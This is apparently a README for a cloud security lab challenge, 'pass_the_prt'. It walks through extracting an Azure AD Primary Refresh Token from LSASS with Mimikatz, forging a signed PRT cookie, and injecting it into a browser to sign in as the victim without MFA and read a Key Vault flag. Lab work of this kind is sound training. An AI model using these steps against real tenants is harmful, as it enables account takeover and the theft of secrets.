# pass_the_prt — Pass-the-PRT: Lateral Movement to the Cloud

**Difficulty:** Advanced  
**Category:** Identity / PRT Abuse / MFA Bypass

## Scenario

A Windows Server VM is Azure AD-joined. A corporate user (`ptp-victim-*`) routinely signs in to this workstation with their Azure AD credentials, which causes Windows to cache a **Primary Refresh Token (PRT)** in LSASS. The PRT is a long-lived SSO credential — equivalent to a Kerberos TGT for the cloud — that Azure AD accepts to issue tokens for any Microsoft resource, including the Key Vault where the flag lives.

You have compromised the machine and hold local admin rights. The victim user has already logged on (step 1 below simulates this). Your goal is to extract the PRT, craft a forged cookie, and authenticate to Azure as the victim — completely bypassing any MFA requirements, since the PRT already encodes a satisfied device-compliance claim.

## Background: what is a PRT?

A PRT is issued by Azure AD's CloudAP (Cloud Authentication Provider) plugin when a user signs in on an Azure AD-joined device. It is stored in LSASS alongside an encrypted **ProofOfPossession (PoP) key** (session key protected by the device's DPAPI/TPM). Together they allow the device to mint short-lived browser cookies and access tokens without prompting the user for credentials again.

Because the PRT embeds the device identity, it bypasses conditional access policies that require MFA or a compliant device. An attacker who extracts it can replay it from any machine.

## Deploy

```shell
cnimbus azure create --app-id pass_the_prt
```

## Attack Walkthrough

### Step 1 — Seed the victim's PRT (simulate the victim using the workstation)

RDP to the VM using the **victim's Azure AD credentials** to trigger PRT issuance:

```
mstsc /v:<vm_public_ip>
Username: <victim_upn>        # e.g. ptp-victim-ab12cd34@contoso.onmicrosoft.com
Password: <victim_password>
```

Once the desktop loads, open a command prompt and verify the PRT exists:

```cmd
dsregcmd /status
```

Look for `AzureAdPrt : YES` in the **SSO State** section. Then **log off** (not disconnect) to end the session — the PRT remains cached in LSASS.

### Step 2 — Connect as the local admin (attacker)

```
mstsc /v:<vm_public_ip>
Username: attacker
Password: <attacker_password>
```

### Step 3 — Extract the PRT from LSASS

Open a command prompt **as Administrator** and launch Mimikatz:

```
C:\Tools\mimikatz\x64\mimikatz.exe
```

```
privilege::debug
sekurlsa::cloudap
```

From the output, copy two values:
- **PRT** — the base64-encoded token
- **ProofOfPossessionKey** — the encrypted session key blob

### Step 4 — Decrypt the session key

Still in Mimikatz, elevate to SYSTEM context to access the machine's DPAPI master key, then decrypt:

```
token::elevate
dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect
```

Copy the two output values:
- **Context**
- **DerivedKey**

### Step 5 — Generate a PRT cookie

```
dpapi::cloudapkd /context:<Context> /derivedkey:<DerivedKey> /prt:<PRT>
```

The output ends with a line starting `Signature with key:`. Copy the full value that follows — this is your signed PRT cookie.

### Step 6 — Inject the cookie into a browser

On **any machine** (including your own), open Microsoft Edge or Chrome in private/incognito mode and navigate to:

```
https://login.microsoftonline.com
```

Open Developer Tools (`F12`) → **Application** tab → **Cookies** → `login.microsoftonline.com` → clear all existing cookies.

Double-click an empty row and add:

| Field     | Value                              |
|-----------|------------------------------------|
| Name      | `x-ms-RefreshTokenCredential`      |
| Value     | `<paste the signed cookie value>`  |
| HttpOnly  | ✓ (checked)                        |

Refresh the page. If the cookie persists, navigate again to `https://login.microsoftonline.com` — you will be automatically signed in as the victim user, **with no MFA prompt**.

### Step 7 — Read the flag from Key Vault

In the Azure portal (authenticated as victim):

1. Navigate to **Key Vaults** → `<keyvault_name>`
2. **Secrets** → `flag` → click the version → **Show Secret Value**

Or via the Azure CLI with the access token obtained from the authenticated session:

```shell
az keyvault secret show --vault-name <keyvault_name> --name flag --query value -o tsv
```

### Step 8 — Submit the flag

```shell
cnimbus azure validate --app-id pass_the_prt --flag "CUMULONIMBUS{...}"
```

## Why MFA does not help

The PRT encodes the device claim (`DeviceId`, `TrustType: AzureAD`). Azure AD's token issuance engine treats a valid PRT cookie as proof that the user already satisfied MFA on a compliant device. Conditional access policies requiring MFA or device compliance are therefore silently bypassed.

## Teardown

```shell
cnimbus azure destroy --app-id pass_the_prt
```
